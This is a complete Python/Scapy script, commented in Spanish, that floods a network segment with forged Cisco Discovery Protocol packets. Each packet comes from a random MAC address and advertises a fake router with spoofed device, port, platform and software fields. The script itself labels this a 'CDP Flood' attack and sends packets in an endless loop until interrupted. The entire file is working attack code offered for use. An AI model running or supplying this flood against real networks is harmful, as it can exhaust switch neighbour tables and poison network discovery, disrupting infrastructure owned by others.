#!/usr/bin/env python3
import sys
import time
import struct
from scapy.all import *

# --- CONFIGURACIÓN ---
interface = "eth0"
# ---------------------

def crear_tlv(tipo, valor):
    """
    Crea un campo TLV. Detecta si es texto (str) o bytes puros.
    """
    if isinstance(valor, str):
        val_bytes = valor.encode('utf-8')
    else:
        val_bytes = valor # Si ya son bytes, los dejamos igual
        
    length = 4 + len(val_bytes)
    return struct.pack("!HH", tipo, length) + val_bytes

print(f"[*] Iniciando ataque CDP Flood (Modo RAW + Capabilities) en {interface}...")
print("[*] Ahora simulamos ser Routers legítimos.")
print("[*] Presiona Ctrl+C para detener.")

try:
    packet_count = 0
    while True:
        # 1. Datos aleatorios
        mac_src = RandMAC()
        device_id = f"Router_Falso_{RandNum(100, 999)}"
        port_id = f"Ethernet{RandNum(0, 3)}/{RandNum(0, 3)}"
        
        # 2. Construcción MANUAL del Payload
        # Cabecera CDP: Versión (2) + TTL (180s) + Checksum (0)
        cdp_header = b'\x02\xb4\x00\x00'
        
        # TLVs
        # Device ID (0x0001)
        tlv_device = crear_tlv(0x0001, device_id)
        # Port ID (0x0003)
        tlv_port = crear_tlv(0x0003, port_id)
        # Platform (0x0006)
        tlv_platform = crear_tlv(0x0006, "Cisco IOU L3 (Emulated)")
        # Software Version (0x0005)
        tlv_soft = crear_tlv(0x0005, "Cisco IOS Software (I86BI_LINUX-L3-M)")
        
        # --- LA PIEZA FALTANTE: CAPABILITIES (0x0004) ---
        # 4 bytes de flags. El bit final (0x01) significa "Soy un Router".
        # Formato binario: 00 00 00 01
        tlv_cap = crear_tlv(0x0004, b'\x00\x00\x00\x01')

        # Unimos todo
        payload_cdp = cdp_header + tlv_device + tlv_port + tlv_cap + tlv_platform + tlv_soft

        # 3. Enviar
        packet = Ether(src=mac_src, dst="01:00:0c:cc:cc:cc") / \
                 LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
                 SNAP(OUI=0x00000c, code=0x2000) / \
                 Raw(load=payload_cdp)

        sendp(packet, iface=interface, verbose=0)
        
        packet_count += 1
        print(f"\r[+] Paquetes enviados: {packet_count}", end="")
        time.sleep(0.01)

except KeyboardInterrupt:
    print("\n\n[!] Ataque detenido.")
